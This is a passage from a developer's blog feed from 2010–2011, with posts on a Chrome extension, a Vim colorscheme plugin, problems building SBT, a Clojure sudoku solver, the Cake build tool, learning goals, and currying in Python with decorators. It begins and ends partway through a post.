<p>We register handlers for events that our &ldquo;client&rdquo; (the content script) is able to raise. Here we deal with 2 kinds of events: fetch_entry and open_tab.</p>

<ul>
<li>Although Chrome 13 allows cross-site requests from content scripts, I&rsquo;m actually quite fond of this pattern of delegating requests to the background page.</li>
<li>chrome.tabs isn&rsquo;t accessible in the content script. That&rsquo;s why open_tab is an event the client (the content script) can raise and delegate chrome specific API calls to the background script.</li>
</ul>


<h2>After Thoughts</h2>

<p>That&rsquo;s it! That&rsquo;s my first Chrome extension. It&rsquo;s not earth shattering or anything but I learned quite a lot. I like Chrome extension development &ndash; it&rsquo;s straightforward and simple. The architecture is quite simple yet powerful. The code is on <a href="https://github.com/kevinjqiu/greader">Github</a> and I plan to expand it to a framework for customizing Google Reader experience. Here are a few things we can do with the extension:</p>

<ul>
<li>Link &ldquo;Share&rdquo; action to twitter/Google+</li>
<li>Click on &ldquo;Like&rdquo; action to automatically vote up on DZone (or any other news aggregator)</li>
<li>Share with comment on Google Reader puts the comment on the entry on DZone (or any other news aggregator)</li>
<li>endless opportunities&hellip;</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Spectrum.vim - My first Vim plugin]]></title>
    <link href="http://kevinjqiu.github.io/2011/04/20/spectrum-dot-vim-my-first-vim-plugin/"/>
    <updated>2011-04-20T20:09:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2011/04/20/spectrum-dot-vim-my-first-vim-plugin</id>
    <content type="html"><![CDATA[<p>ver the past few months, I&rsquo;ve been using Vim as my primary development tool at work and at home, and I have to say, I&rsquo;m addicted to it! I&rsquo;m thinking about writing a blog post of why I get hooked on <a href="http://walking-without-crutches.heroku.com/">walking without crutches</a>, but for this post, I&rsquo;m just going to introduce you to my first plugin in Vim - <a href="https://github.com/kevinjqiu/spectrum.vim">Spectrum</a>.</p>

<h2>Introduction</h2>

<p>Spectrum is a vim colorscheme roulette. Ever getting tired of staring at the same colorscheme every day? Having hundreds of colorschemes in your repo but too lazy to deterministically pick one? Spectrum helps you by randomly pick colorschemes from your vim runtime path or from the <a href="http://inspiration.sweyla.com/code/">web</a>. From there, you have the chance of voting up a colorscheme so Spectrum will have a higher probability to pick it or voting down a colorscheme so you wouldn&rsquo;t see it again.</p>

<h2>Development</h2>

<p>To be honest, I&rsquo;m not a fan of <a href="http://en.wikipedia.org/wiki/Vimscript">Vimscript</a> - the language is not very expressive and doesn&rsquo;t have a lot of object oriented features. Semi-fortunately, since Vim 7, they have added support for Python, Ruby and Perl scripts. I said &lsquo;semi-fortunately&rsquo; because the support isn&rsquo;t too comprehensive. For most core vim features, you still have to resort to calling Vim commands to achieve them, but at least I don&rsquo;t have to use Vim script for the most part.</p>

<p>Spectrum is written in Python, and use the <code>vim</code> module to interact with the hosting Vim instance. There is a bit of bootstrapping to do if you want to separate most of the Python code out of the entry point vim script (see <a href="https://github.com/kevinjqiu/spectrum.vim/blob/master/plugin/spectrum.vim">here</a>). Many vim plugins written in Python require you to install the python code into your Python runtime before you can use them, but for a simple module like Spectrum, I opted for monkey patching syspath to include modules in the plugin folder.</p>

<p>Anyhow, give it a try and hope you like it.</p>

<p><a href="https://github.com/kevinjqiu/spectrum.vim">https://github.com/kevinjqiu/spectrum.vim</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Scala Simple Build Tool -- Not so simple after all]]></title>
    <link href="http://kevinjqiu.github.io/2011/03/17/scala-simple-build-tool-not-so-simple-after-all/"/>
    <updated>2011-03-17T20:04:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2011/03/17/scala-simple-build-tool-not-so-simple-after-all</id>
    <content type="html"><![CDATA[<p><strong>Update:</strong> I got sbt working by building directly from the master branch from their github repo. The current version is 0.7.5. The tagged 0.9.4 version is actually an older version. Anyway, tried it and kinda loved it.</p>

<p>This is just another late night rambling&hellip;I was trying to get a proper scala build system setup. I was using Maven scala plugin for a while, but longing for something simpler and more scalanic (is there such a word?). I was pretty <a href="2011/02/11/cake-the-yummy-clojure-build-system/">happy</a> with <a href="https://github.com/ninjudd/cake">Cake</a>, the Clojure build system and expected SBT to allow me to break away from using Maven to build Scala projects&hellip;boy, was I wrong&hellip;</p>

<p>First off, when you google &lsquo;simple build tool&rsquo;, you get a link to the SBT <a href="http://code.google.com/p/simple-build-tool/">Google code home page</a>. Well, nothing wrong there, except the &ldquo;latest&rdquo; version on Google code was 0.7.4 and it was half a year ago&hellip;Maybe it&rsquo;s not that outdated, so I downloaded it, followed <a href="http://code.google.com/p/simple-build-tool/wiki/Setup">this</a> instruction and setup my <code>~/bin/sbt</code> script. Running it, it asked me to setup projects, and it only supported up until Scala 2.7.7&hellip;Hrm, 2.8 was out for a while now, so obviously, SBT 0.7.4 isn&rsquo;t the latest. Reading their home page more carefully, they&rsquo;re moving the repository to <a href="https://github.com/harrah/xsbt">Github</a>. Awesome! I&rsquo;d pick Github over Google Code any time too.</p>

<p>Heading over to their Github repo, and found the latest stable version is 0.9.2. Good! So it should support Scala 2.8 now! Downloaded the zip, unzipped it, and of course it wasn&rsquo;t executable. You need to build it. There&rsquo;s a README.md, so quickly I less&#8217;ed it. For step 1, it asked me to go to the setup wiki page on Google Code (!), which is the steps I did setting up 0.7.4&hellip;I guess they&rsquo;re using 0.7.4 as a bootstrapping build&hellip;Anyways, I did that. Step 2 was to run <code>sbt update "project Launcher" proguard "project Simple Build Tool" "publish-local"</code>. Of course it didn&rsquo;t work. It&rsquo;s complained 0.7.4 version of sbt-launch can&rsquo;t download Scala 2.7.7 from any of the repository&hellip;bummer! But hey, I can download Scala 2.7.7 lib from Maven! So I quickly updated pom.xml of one of my projects to use Scala 2.7.7 and did an upgrade. Now 2.7.7 is happily in my local Maven repo. Ran that command again, hooray! It started to build, and judging by the number of packages it&rsquo;s building, &ldquo;simple&rdquo; isn&rsquo;t the first adjective that comes into my mind. Anyway, it&rsquo;s building at least, so even if it&rsquo;s a little complicated, so be it&hellip;Except&hellip;of course it broke half way&hellip; and why?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[info]   Post-analysis: 107 classes.
</span><span class='line'>[info] == Precompiled 2.7.7 / compile ==
</span><span class='line'>[info] 
</span><span class='line'>[info]    Precompiled 2.8.0 / compile ...
</span><span class='line'>[info] 
</span><span class='line'>[info] == Precompiled 2.8.0 / compile ==
</span><span class='line'>[info]   Source analysis: 9 new/modified, 0 indirectly invalidated, 0 removed.
</span><span class='line'>[info] Compiling main sources...
</span><span class='line'>[warn] there were deprecation warnings; re-run with -deprecation for details
</span><span class='line'>[warn] one warning found
</span><span class='line'>[info] Compilation successful.
</span><span class='line'>[info]   Post-analysis: 108 classes.
</span><span class='line'>[info] == Precompiled 2.8.0 / compile ==
</span><span class='line'>java.lang.OutOfMemoryError: PermGen space
</span><span class='line'>        at java.lang.ClassLoader.defineClass1(Native Method)
</span><span class='line'>        at java.lang.ClassLoader.defineClassCond(ClassLoader.java:632)
</span><span class='line'>        at java.lang.ClassLoader.defineClass(ClassLoader.java:616)</span></code></pre></td></tr></table></div></figure>


<p>You&rsquo;ve gotta be kidding me! I set <code>-Xmx512M</code> and it&rsquo;s not enough? And why is it building every version of Scala <strong>from source</strong>?? Is there something called a&hellip;JAR?</p>

<p>Anyway, increased <code>-Xmx</code> from 512 to 1024M, ran again, wait, and same thing happened again! Out of PermGen space&hellip;urrgh&hellip;</p>

<p>I decided to give up, at least for the day&hellip; SBT is anything but simple, at least from my experience. I know it&rsquo;s open source and people put efforts into it without compensation, so I shouldn&rsquo;t be critical about it. I&rsquo;ll give it a try again, and hopefully it&rsquo;s worth the time investment.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Write sudoku solver in Clojure]]></title>
    <link href="http://kevinjqiu.github.io/2011/03/02/write-sudoku-solver-in-clojure/"/>
    <updated>2011-03-02T20:00:00-05:00</updated>
    <id>http://kevinjqiu.github.io/2011/03/02/write-sudoku-solver-in-clojure</id>
    <content type="html"><![CDATA[<p>&hellip;yeah, because the world just needs another <a href="http://en.wikipedia.org/wiki/Sudoku">Sudoku</a> solver. Well, I&rsquo;m not trying to solve world hunger with it, but just an attempt to practice <a href="http://clojure.org">clojure</a>, I took (read: stole) Peter Norvig&rsquo;s <a href="http://norvig.com/sudoku.html">sudoku solver</a> algorithm (written in Python) and adapted it into Clojure. I put it up on Github under <a href="https://github.com/kevinjqiu/sudoku-clj">sudoku-clj</a>. The algorithm itself isn&rsquo;t <em>that</em> hard to understand. The porting to a lisp-y syntax made the code a little longer than its Python counterpart. I&rsquo;m sure seasoned Lisp/Clojure users can point out dozens of places where more idiomatic/succinct syntax can be used (If you happen to be one, do tell, by the way).</p>

<p>Here&rsquo;s a few things I noticed:</p>

<ul>
<li><p>Mutable states in clojure are captured using <code>ref</code>s. The object itself (in this case, the grid, which is a hash map) doesn&rsquo;t mutate, but the reference is changed to point to different grid objects that represent a configuration at a given step.</p></li>
<li><p>Clojure sequences are Lazy. A few times I tried to print out the current state (remaining digits) of the square, but if you simply do <code>(println seq)</code>, you will get a Java-ish <code>toString()</code> output of the sequence object. You need to force the lazy sequence to be evaluated by <code>(println (apply str seq))</code>. Needless to say, you lose the advantage of lazy sequences, so use it sparingly.</p></li>
<li><p>Python&rsquo;s list comprehension syntax is fabulous. Clojure&rsquo;s counterpart for comprehension doesn&rsquo;t feel as elegent, nor is map a function onto a sequence to achieve that (the way I used it)</p></li>
<li><p><a href="http://kevinjqiu.github.io/2011/02/11/cake-the-yummy-clojure-build-system/">Cake</a> is yummy!</p></li>
<li><p>The performance isn&rsquo;t great&hellip;I must have done something wrong, but the easy sudoku grid took about 2 seconds (with the JVM already booted), while the Python algorithm solves it in a fraction of a second.</p></li>
<li><p>Because assign/eliminate are mutually recursive, my current implementation uses the naive way of doing recursion, i.e., let the stack grow. Clojure has a function <code>trampoline</code>, which adds a level of indirection that applies to mutually recursive functions. It uses <code>recur</code> at tail end position (basically translates the recursive calls into loops) which doesn&rsquo;t fill your process&rsquo;s stack. It might not be obvious (to me anyways) how one can do that with a few levels of function calls in between assign/eliminate, but I&rsquo;m sure there&rsquo;s a way</p></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Cake - the yummy Clojure build system]]></title>
    <link href="http://kevinjqiu.github.io/2011/02/11/cake-the-yummy-clojure-build-system/"/>
    <updated>2011-02-11T19:56:00-05:00</updated>
    <id>http://kevinjqiu.github.io/2011/02/11/cake-the-yummy-clojure-build-system</id>
    <content type="html"><![CDATA[<p>About 10 minutes ago I heard about <a href="https://github.com/ninjudd/cake">cake</a> clojure build system, and gave it a try. And 10 minutes later, it won me over! Wow, it addresses all the pain points of <a href="https://github.com/technomancy/leiningen">leiningen</a>.</p>

<h2>BLAZINGLY FAST!!!</h2>

<p>Sorry for using all CAPS but I&rsquo;m very excited about this improvement over leiningen &ndash; OK, it may not be the fault of leiningen that JVM cold startup time is non-trivial but hey, someone came up with an idea of having a long running JVM process in the background, so subsequent clojure tasks reuse the same JVM instance. Cake folks integrated that nicely. It takes about 10-15 seconds to boot up a JVM but subsequent cake tasks or execution of clojure code is virtually instant! Comparing to leiningen, which doesn&rsquo;t take this approach and every single task (such as common ones like lein test) takes around 5 seconds. This adds up quickly and makes you less efficient. The speed improvement alone is enough for me to switch to cake.</p>

<h2>Advanced REPL functionalities: tab completion, history</h2>

<p>It just works. Very useful for having instant feedbacks while exploring the language and API. No more manually adding jLine to your classpath or hack around tab completion wrapper&hellip;It just works! (I know I said it already)</p>

<h2>run clojure files directly</h2>

<p>OK, leiningen can do this too, but through <a href="https://github.com/sids/lein-run">plugin</a>. I feel this is a very handy functionality, which probably should be included in the core.</p>

<h2>autotest</h2>

<p>Detects your code change and automatically run your test suites! Sweet.</p>

<h2>compatible with leiningen project definition files</h2>

<p>Cake understand <code>project.clj</code>, so I don&rsquo;t need to do anything for my existing leiningen projects. Change directory to the project and <code>cake</code> away :D</p>

<p>Overall, it just works out of the box. No more mucking around with dev-dependencies and other chores and let you focus on what you&rsquo;d love to do.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[New Year's Resolution]]></title>
    <link href="http://kevinjqiu.github.io/2011/01/02/new-years-resolution/"/>
    <updated>2011-01-02T19:47:00-05:00</updated>
    <id>http://kevinjqiu.github.io/2011/01/02/new-years-resolution</id>
    <content type="html"><![CDATA[<p>2011 here we come! In the spirit of continual learning, I&rsquo;m going to write down the technology I&rsquo;d love to learn this year.</p>

<h2><a href="http://haskell.org" title="">Haskell</a></h2>

<p>Now that I&rsquo;m more interested in functional languages, I&rsquo;d love to look into this &ldquo;pure&rdquo; functional language that inspired countless other ones of its kind.</p>

<h2><a href="http://liftweb.net">Lift</a></h2>

<p>Last year I scratched the surface of <a href="http://www.scala-lang.org">Scala</a>, a hybrid JVM language. I&rsquo;m very fond of it, and think it has tremendous potential. Twitter and FourSquare are already using Scala, so it has been put to the test of some pretty high-profile usages.  Lift is the most popular web framework built on top of Scala. It claims to have the rapid application development benefits from Rails and the benefits from statically typed language.</p>

<h2>More advanced features of <a href="http://clojure.org">Clojure</a></h2>

<p>In the past two years, I explored Clojure and on off. I love the Lisp idea of <a href="http://en.wikipedia.org/wiki/Homoiconicity">homoiconicity</a> which unifies programming and meta-programming. That said, I haven&rsquo;t been using macro in Clojure too much, and there are other cool ideas of Clojure I haven&rsquo;t been able to explore deeply, such as protocols and <a href="http://en.wikipedia.org/wiki/Software_transactional_memory">software transactional memory</a></p>

<h2><a href="http://www.ruby-lang.org/en/">Ruby</a> and <a href="http://rubyonrails.org/">Rails</a></h2>

<p>For the past few years, I&rsquo;ve been refraining myself from learning Ruby, because I&rsquo;m already quite adept at Python, and I feel I should be learning languages that are different from what I already know. However, the more I heard about Ruby and its ideas, the more interesting it appears to me. On top of that, Rails 3 has come out, and it appears to have improved significantly. Moreover, there are a lot of advancement in the Ruby VM world such as JRuby, which means Ruby applications don&rsquo;t have to run on the old and dreadful (hear-say) MRI. I wouldn&rsquo;t mind taking Ruby and Rails out for a spin this year.</p>

<h2><a href="http://www.android.com/">Android</a></h2>

<p>Last year I got an HTC Legend Android phone, with the intention of developing for Android at some point of time. It didn&rsquo;t work out that way, though, but Android continues to be a very interesting and fast growing platform. Mobile <em>is</em> the future, and I&rsquo;d like to poke into the Android world this year, primarily because it&rsquo;s open source. iOS is equally interesting technically, but I don&rsquo;t own a Mac and I don&rsquo;t like the idea of paying Apple $99 for SDK even though I don&rsquo;t intend to publish on AppStore.</p>

<p>I think that&rsquo;s enough for a year&hellip;or is it? There&rsquo;s a few more technologies I wish to learn or keep up with:</p>

<h2>GWT and Google App Engine</h2>

<p>2 years of professional GWT development made me a firm fan of this Google technology. I got out of GWT for different reasons, but I love the engineering effort they put into GWT. It may not take over the world but it&rsquo;s definitely a solid player in the front-end web development arena. Especially now they integrated with the Spring framework and made deploying to App Engine easy, it may pick up more traction this year. I think the Java language is both the pros and cons of GWT. I&rsquo;d love to see an alternative language (Scala) being implemented for GWT, but it may not happen any time soon.</p>

<h2>A &ldquo;NoSQL&rdquo; database</h2>

<p>Let&rsquo;s face it, &ldquo;NoSQL&rdquo; is a terrible name, but it grabs people&rsquo;s attention. I flirted with <a href="http://couchdb.apache.org/">CouchDB</a> briefly last year, and would love to continue this journey this year. Also, <a href="http://www.mongodb.org/">MongoDB</a> seems interesting too.</p>

<h2>Node.js</h2>

<p>It&rsquo;s the least I think I&rsquo;d learn this year. It&rsquo;s hot in the geekdom right now, and it has its value, for example, having both the server and client side written in Javascript eliminates the need to implement the validation logic in two different languages. However, I&rsquo;m just not a big fan of Javascript. I think it&rsquo;s a language that&rsquo;s by a chain of serendipitous events became the world&rsquo;s most widely used language. It carries a huge historical burden, and although it has cool features, some other modern languages have them too and do better. Regardless, given the stardom status of Node.js, it deserves some looking into :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Use Python decorator to curry functions]]></title>
    <link href="http://kevinjqiu.github.io/2010/10/22/use-python-decorator-to-curry-functions/"/>
    <updated>2010-10-22T20:06:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2010/10/22/use-python-decorator-to-curry-functions</id>
    <content type="html"><![CDATA[<p>It&rsquo;s been a while since the last time I wrote about Python. This morning, I was listening to a podcast on my way to work. They were discussing functional programming and dynamic languages&hellip;I learned Python before I went into Computer Science, and then I learned about functional programming and through learning of Scala and Clojure, my functional programming concepts have been enriched. As I was listening, it suddenly appeared to me that there isn&rsquo;t a way in Python to <a href="http://en.wikipedia.org/wiki/Currying">curry</a> a function. Not that it&rsquo;s critical to everyday development, but wouldn&rsquo;t it be neat if I can curry a function in Python?</p>

<p>Then the hosts of the podcast discussed how dynamic languages are so flexible that you can pretty much do anything to it. &ldquo;You can take a function as parameter, return a function from a function, and so on.&rdquo; Hey, isn&rsquo;t that what Python&rsquo;s <a href="http://www.artima.com/weblogs/viewpost.jsp?thread=240808">decorator</a> can do? I learned decorators before, but I haven&rsquo;t used it beyond the scope of creating properties and certainly haven&rsquo;t written any decorators. I thought this would be a good exercise for learning decorators.</p>

<p>Here&rsquo;s a simple example of what function currying: suppose you have a method</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">x</span><span class="o">+</span><span class="n">y</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then calling <code>add(1,2)</code> should be the same as <code>add(1)(2)</code>. <code>add(1)</code> is what they call a partially applied function. It&rsquo;s a function that takes one parameter.</p>

<p>Our goal here is to write a decorator &ldquo;curried&rdquo; that takes a function with n parameters and transform it in a way that can be applied n times and get the final result.</p>

<p>We&rsquo;ll start with unit tests first:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">unittest</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">CurryTest</span><span class="p">(</span><span class="n">unittest</span><span class="o">.</span><span class="n">TestCase</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">test_with_no_args</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="nd">@curried</span>
</span><span class='line'>        <span class="k">def</span> <span class="nf">do_nothing</span><span class="p">():</span>
</span><span class='line'>            <span class="k">return</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">assertEquals</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">,</span> <span class="n">do_nothing</span><span class="p">())</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">test_with_int_args</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="nd">@curried</span>
</span><span class='line'>        <span class="k">def</span> <span class="nf">add_int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">):</span>
</span><span class='line'>            <span class="k">return</span> <span class="n">x</span><span class="o">+</span><span class="n">y</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">assertEquals</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">add_int</span><span class="p">(</span><span class="mi">1</span><span class="p">)(</span><span class="mi">2</span><span class="p">))</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">test_with_str_args</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="nd">@curried</span>
</span><span class='line'>        <span class="k">def</span> <span class="nf">add_str</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">):</span>
</span><span class='line'>            <span class="k">return</span> <span class="s">&quot;</span><span class="si">%s%s</span><span class="s">&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">assertEquals</span><span class="p">(</span><span class="s">&quot;ab&quot;</span><span class="p">,</span> <span class="n">add_str</span><span class="p">(</span><span class="s">&quot;a&quot;</span><span class="p">)(</span><span class="s">&quot;b&quot;</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>So we make sure that a currying on a function takes no parameter is valid but should be a pass through, and also the &ldquo;curried&rdquo; decorator can be applied to any function with arguments (excluding positional arguments and keyword arguments)</p>

<p>A decorator is simply a function that takes a function as parameter:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">curried</span><span class="p">(</span><span class="n">fn</span><span class="p">):</span>
</span><span class='line'>  <span class="k">pass</span>
</span></code></pre></td></tr></table></div></figure>


<p>and <code>@curried</code> is simply a syntactic sugar for:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">fn</span><span class="p">(</span><span class="o">...</span><span class="p">):</span> <span class="o">...</span>
</span><span class='line'><span class="n">fn</span><span class="o">=</span><span class="n">curried</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, now we can write <code>curried</code> decorator.
To make the test for function with no argument pass, in <code>curried()</code> function, we can test to see if fn has arguments. Python&rsquo;s standard library provides <code>inspect.getargspec</code> method:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">curried</span><span class="p">(</span><span class="n">fn</span><span class="p">):</span>
</span><span class='line'>  <span class="n">argspec</span> <span class="o">=</span> <span class="n">inspect</span><span class="o">.</span><span class="n">getargspec</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argspec</span><span class="o">.</span><span class="n">args</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">fn</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="c"># later</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now the first test passes.</p>

<p>For the other two cases, here&rsquo;s the strategy. In Python, when a class defines <code>__call__</code> method, the instance of that class is said to be &ldquo;callable&rdquo;. For instance:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">class</span> <span class="nc">A</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>  <span class="k">def</span> <span class="nf">__call__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">arg</span>
</span><span class='line'>
</span><span class='line'><span class="n">f</span><span class="o">=</span><span class="n">A</span><span class="p">()</span>
</span><span class='line'><span class="n">f</span><span class="p">(</span><span class="s">&quot;echo&quot;</span><span class="p">)</span>  <span class="c"># this gives you &quot;echo&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is very similar to Scala&rsquo;s <code>apply()</code> function. Now that we have this in our inventory, we can define a <code>PartialFunction</code> class, take all the required parameters of the original function, and allow them to be applied one at a time. So the <code>__call__</code> method of PartialFunc will look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">__call__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span><span class='line'>  <span class="c"># Xxx</span>
</span></code></pre></td></tr></table></div></figure>


<p>If all the required parameters are passed in, <code>PartialFunc</code> should evaluate the original function with the complete argument list. Otherwise, <code>PartialFunc</code> stores the parameter in an instance variable, and returns itself.</p>

<p>Here&rsquo;s the complete code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">class</span> <span class="nc">PartialFunc</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">fn</span><span class="p">,</span> <span class="n">argspec</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">fn</span> <span class="o">=</span> <span class="n">fn</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">argspec</span> <span class="o">=</span> <span class="n">argspec</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">args</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__call__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
</span><span class='line'>        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">args</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">argspec</span><span class="o">.</span><span class="n">args</span><span class="p">):</span>
</span><span class='line'>            <span class="n">arglist</span> <span class="o">=</span> <span class="s">&quot;,&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">&quot;self.args[</span><span class="si">%d</span><span class="s">]&quot;</span><span class="o">%</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">args</span><span class="p">))])</span>
</span><span class='line'>            <span class="k">return</span> <span class="nb">eval</span><span class="p">(</span><span class="s">&quot;self.fn(&quot;</span> <span class="o">+</span> <span class="n">arglist</span> <span class="o">+</span> <span class="s">&quot;)&quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="k">return</span> <span class="bp">self</span>
</span></code></pre></td></tr></table></div></figure>


<p>and the curried decorator:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">curried</span><span class="p">(</span><span class="n">fn</span><span class="p">):</span>
</span><span class='line'>    <span class="n">argspec</span> <span class="o">=</span> <span class="n">inspect</span><span class="o">.</span><span class="n">getargspec</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argspec</span><span class="o">.</span><span class="n">args</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
